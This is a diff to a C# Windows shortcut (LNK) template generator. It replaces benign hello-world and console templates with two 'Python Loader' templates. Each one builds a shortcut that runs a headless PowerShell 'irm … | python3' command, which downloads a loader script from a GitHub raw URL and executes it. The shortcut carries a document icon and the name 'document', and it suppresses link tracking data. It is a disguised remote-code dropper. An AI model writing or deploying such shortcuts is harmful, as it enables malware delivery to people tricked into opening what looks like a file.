@@ -1345,58 +1345,25 @@
         ConsoleData? Console = null, string? AppUserModelId = null,
         bool ForceNoLinkTrack = false, bool ForceNoLinkInfo = false);
 
+    private const string DefaultAgentLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/loader.py";
+
     private static readonly LnkTemplate[] LnkTemplates =
     [
-        new("PowerShell Hello World",
+        new("Python Loader (Hidden)",
             @"C:\Windows\System32\conhost.exe",
-            "--headless powershell.exe \"(New-Object -ComObject WScript.Shell).Popup('Hello World')\"",
-            null, "Headless launching a PowerShell popup",
-            @"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe", 0,
-            ShortcutWindowStyle.Minimized, false, "ps-helloworld"),
+            $"--headless powershell.exe -NoP -C irm {DefaultAgentLoaderUrl} | python3",
+            null, null,
+            @"%SystemRoot%\system32\shell32.dll", 1,
+            ShortcutWindowStyle.Minimized, false, "document",
+            ForceNoLinkTrack: true, ForceNoLinkInfo: true),
 
-        new("Admin Command Prompt PowerShell Base64 Hello World",
-            @"C:\Windows\System32\conhost.exe",
-            $"--headless powershell.exe -e {Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("(New-Object -ComObject WScript.Shell).Popup('Elevated Hello World')"))}",
-            @"C:\", "Elevated Command Prompt",
-            @"%SystemRoot%\system32\cmd.exe", 0,
-            ShortcutWindowStyle.Minimized, true, "admin-cmd"),
-
-        new("Admin PowerShell",
+        new("Python Loader (Visible)",
             @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
-            "-NoExit", @"C:\", "Elevated PowerShell",
-            @"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe", 0,
-            ShortcutWindowStyle.Normal, true, "admin-powershell"),
-
-        new("Developer Console",
-            @"C:\Windows\System32\cmd.exe",
-            "/k echo Developer Console Ready",
-            @"C:\", "Custom developer console with console settings",
-            @"%SystemRoot%\system32\cmd.exe", 0,
-            ShortcutWindowStyle.Normal, false, "dev-console",
-            Console: new ConsoleData
-            {
-                ScreenBufferSizeX = 160,
-                ScreenBufferSizeY = 9001,
-                WindowSizeX = 160,
-                WindowSizeY = 40,
-                FaceName = "Cascadia Mono",
-                FontWeight = 400,
-                QuickEdit = true,
-                InsertMode = true,
-                AutoPosition = true,
-                HistoryBufferSize = 50,
-                HistoryNoDup = true,
-                CursorSize = 25
-            },
-            ForceNoLinkTrack: true),
-
-        new("Taskbar PowerShell",
-            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
-            "-NoExit -Command \"$Host.UI.RawUI.WindowTitle = 'My PowerShell'\"",
-            @"C:\", "PowerShell with custom taskbar grouping",
-            @"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe", 0,
-            ShortcutWindowStyle.Normal, false, "taskbar-powershell",
-            AppUserModelId: "Custom.PowerShell.Instance"),
+            $"-NoP -C irm {DefaultAgentLoaderUrl} | python3",
+            null, null,
+            @"%SystemRoot%\system32\shell32.dll", 1,
+            ShortcutWindowStyle.Minimized, false, "document",
+            ForceNoLinkTrack: true, ForceNoLinkInfo: true),
     ];
 
     private void OnTemplateSelected(ChangeEventArgs e)
